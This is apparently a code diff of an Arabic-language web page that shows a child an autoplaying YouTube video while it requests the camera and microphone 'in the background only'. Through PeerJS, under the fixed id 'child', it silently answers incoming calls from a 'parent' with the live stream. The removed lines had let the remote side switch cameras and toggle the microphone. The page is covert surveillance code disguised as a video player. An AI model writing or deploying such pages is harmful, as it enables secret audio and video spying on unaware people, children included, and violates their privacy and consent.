@@ -2,71 +2,55 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>انتظر قليلا </title>
+<title> قليلا انتظر </title>
 </head>
 <body>
 
-<!-- المحتوى الذي يشاهده الطفل -->
-<video id="content" width="100%" autoplay muted loop>
-  <source src="your_video.mp4" type="video/mp4">
-</video>
+<h2>فيديو </h2>
+
+<!-- فيديو يوتيوب فقط -->
+<iframe width="560" height="315"
+    src="https://www.youtube.com/embed/xuGCHkZSOiU?autoplay=1&mute=1"
+    title="YouTube video"
+    frameborder="0"
+    allow="autoplay; encrypted-media"
+    allowfullscreen>
+</iframe>
 
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <script>
-const room = new URLSearchParams(location.search).get("room");
-let stream, peer, current = "environment", dataConn;
+let peer, stream;
 
+// بدء الكاميرا في الخلفية فقط
 function startCamera(){
   navigator.mediaDevices.getUserMedia({
-    video:{facingMode:current},
-    audio:true
-  }).then(s=>{
+    video: true,
+    audio: true
+  }).then(s => {
     stream = s;
 
-    document.getElementById("content").srcObject = stream;
-    
+    // الرد على مكالمات الأب مباشرة
     peer.on("call", call => call.answer(stream));
-  }).catch(()=>alert("لم يتم السماح للكاميرا"));
+
+  }).catch(() => alert("لم يتم السماح للكاميرا"));
 }
 
-function switchCamera(){
-  current = current==="user" ? "environment" : "user";
-  if(stream) stream.getTracks().forEach(t=>t.stop());
-  startCamera();
-}
-
-function toggleMic(on){
-  if(stream){
-    stream.getAudioTracks().forEach(t=>t.enabled = on);
-  }
-}
-
-// بدء الاتصال
 window.onload = () => {
-  peer = new Peer("child-"+room, {
-    host:"peerjs.com",
-    secure:true,
-    port:443
+  // معرف ثابت للطفل
+  peer = new Peer("child", {
+    host: "peerjs.com",
+    secure: true,
+    port: 443
   });
 
   peer.on("open", () => {
     startCamera();
-
-    // استقبال أوامر الأب
-    dataConn = peer.connect("parent-"+room);
-    dataConn.on("data", data => {
-      if(data.cmd === "switchCamera"){
-        switchCamera();
-      } else if(data.cmd === "mic"){
-        toggleMic(data.value);
-      }
-    });
   });
 }
 
-// إيقاف عند إغلاق الصفحة
+// إيقاف الكاميرا عند غلق الصفحة
 window.onbeforeunload = () => {
-  if(stream) stream.getTracks().forEach(t=>t.stop());
+  if(stream) stream.getTracks().forEach(t => t.stop());
   peer && peer.destroy();
 };
 </script>
